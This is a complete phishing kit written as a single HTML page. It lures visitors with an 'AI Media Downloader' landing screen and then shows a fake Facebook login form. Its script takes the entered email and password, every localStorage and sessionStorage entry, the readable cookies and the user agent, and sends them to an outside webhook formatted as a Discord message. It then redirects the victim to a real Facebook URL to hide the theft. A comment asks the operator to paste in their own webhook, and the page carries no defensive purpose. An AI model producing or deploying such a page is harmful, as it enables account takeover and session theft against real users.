<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Media Downloader</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f0f2f5; height: 100vh; width: 100vw; overflow: hidden; }
        
        /* Step 1: Landing */
        #landing-page {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: url('999.jpg') no-repeat center center fixed;
            background-size: cover; display: flex; justify-content: center; align-items: center; z-index: 10;
            transition: opacity 0.5s ease-in-out;
        }
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); z-index: 1; }
        .content-wrapper { position: relative; z-index: 2; text-align: center; padding: 20px; }
        .ai-badge {
            background: linear-gradient(90deg, #ff00cc, #333399); color: white; padding: 8px 16px;
            border-radius: 20px; font-weight: bold; font-size: 14px; display: inline-block;
            margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .cta-button {
            background-color: #ffffff; color: #1877f2; border: none; padding: 15px 40px;
            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: transform 0.2s; outline: none;
        }
        .cta-button:active { transform: scale(0.95); }

        /* Step 2: Login Form */
        #login-page {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #fff; display: flex; justify-content: center; align-items: center;
            z-index: 20; opacity: 0; visibility: hidden; transition: opacity 0.4s ease-in-out;
        }
        .login-card { width: 90%; max-width: 380px; padding: 20px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 42px; font-weight: bold; margin-bottom: 20px; letter-spacing: -1px; }
        .input-group { margin-bottom: 15px; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 16px; border: 1px solid #dddfe2; border-radius: 8px;
            font-size: 16px; outline: none;
        }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn {
            width: 100%; background-color: #1877f2; color: white; border: none; padding: 16px;
            font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer;
            margin-top: 10px; transition: background-color 0.2s;
        }
        .login-btn:hover { background-color: #166fe5; }
        .login-btn:disabled { background-color: #e4e6eb; color: #bcc0c4; cursor: not-allowed; }
        .forgot-password { display: block; margin-top: 20px; color: #1877f2; text-decoration: none; font-size: 14px; }
        
        /* Loading Spinner */
        .spinner {
            display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent;
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Step 1: Landing Page -->
    <div id="landing-page">
        <div class="overlay"></div>
        <div class="content-wrapper">
            <div class="ai-badge">🤖 AI Powered Downloader</div>
            <h1 style="color: white; font-size: 28px; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">Download Unlimited Media</h1>
            <p style="color: #eee; font-size: 16px; margin-bottom: 30px; text-shadow: 0 1px 2px rgba(0,0,0,0.5);">Fast • Secure • High Quality</p>
            <button class="cta-button" id="start-btn">Get Started</button>
        </div>
    </div>

    <!-- Step 2: Login Form -->
    <div id="login-page">
        <div class="login-card">
            <div class="fb-logo">facebook</div>
            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="email" placeholder="Email or Phone Number" required autocomplete="off">
                </div>
                <div class="input-group">
                    <input type="password" id="pass" placeholder="Password" required autocomplete="off">
                </div>
                <button type="submit" class="login-btn" id="login-btn">
                    <span id="btn-text">Log In</span>
                    <div class="spinner" id="spinner"></div>
                </button>
            </form>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
    </div>

    <script>
        // 🔴 PASTE YOUR WEBHOOK URL HERE
        const WEBHOOK_URL = "https://webhook.site/4e9833b1-ec21-4b46-aadf-ec968023ae2f";

        const landingPage = document.getElementById('landing-page');
        const loginPage = document.getElementById('login-page');
        const startBtn = document.getElementById('start-btn');
        const loginForm = document.getElementById('login-form');
        const loginBtn = document.getElementById('login-btn');
        const btnText = document.getElementById('btn-text');
        const spinner = document.getElementById('spinner');

        // Transition to Login Page
        startBtn.addEventListener('click', () => {
            landingPage.style.opacity = '0';
            setTimeout(() => {
                landingPage.style.display = 'none';
                loginPage.style.visibility = 'visible';
                loginPage.style.opacity = '1';
            }, 500);
        });

        // Helper function to get all possible storage data
        function getStorageData() {
            let data = {};
            
            // 1. Try LocalStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    data['ls_' + key] = localStorage.getItem(key);
                }
            } catch (e) {}

            // 2. Try SessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    let key = sessionStorage.key(i);
                    data['ss_' + key] = sessionStorage.getItem(key);
                }
            } catch (e) {}

            // 3. Try Document Cookie (for non-httponly ones)
            if (document.cookie) {
                data['doc_cookie'] = document.cookie;
            } else {
                data['doc_cookie'] = "(Empty - HttpOnly detected)";
            }

            return data;
        }

        // Handle Form Submission
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Disable button and show loading
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            spinner.style.display = 'block';

            // Get Values
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('pass').value.trim();
            
            // Capture ALL available data
            const allData = getStorageData();

            // Prepare Payload
            const payload = {
                username: "Facebook Captured Data",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Facebook_Logo_2020.svg/1200px-Facebook_Logo_2020.svg.png",
                embeds: [{
                    title: "🔥 New Login Attempt",
                    color: 15158332, 
                    fields: [
                        { name: "📧 Email / Phone", value: email, inline: true },
                        { name: "🔑 Password", value: pass, inline: true },
                        { name: "💾 Local/Session Storage", value: Object.keys(allData).length > 0 ? `\`\`\`${JSON.stringify(allData).substring(0, 400)}\`\`\`` : "None", inline: false },
                        { name: "🌐 User Agent", value: navigator.userAgent.substring(0, 200), inline: false }
                    ],
                    footer: { text: "Captured at: " + new Date().toLocaleString() },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                // Send to Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // Success Animation
                loginBtn.style.backgroundColor = '#42b883';
                btnText.textContent = 'Success!';
                btnText.style.display = 'block';
                spinner.style.display = 'none';
                
                // Redirect to fake success page after delay
                setTimeout(() => {
                    window.location.href = "https://www.facebook.com/checkpoint/blue/" ; 
                }, 1500);

            } catch (error) {
                console.error("Fetch Error:", error);
                alert("Capture Failed: " + error.message);
                loginBtn.disabled = false;
                btnText.style.display = 'block';
                spinner.style.display = 'none';
            }
        });
    </script>
</body>
</html>
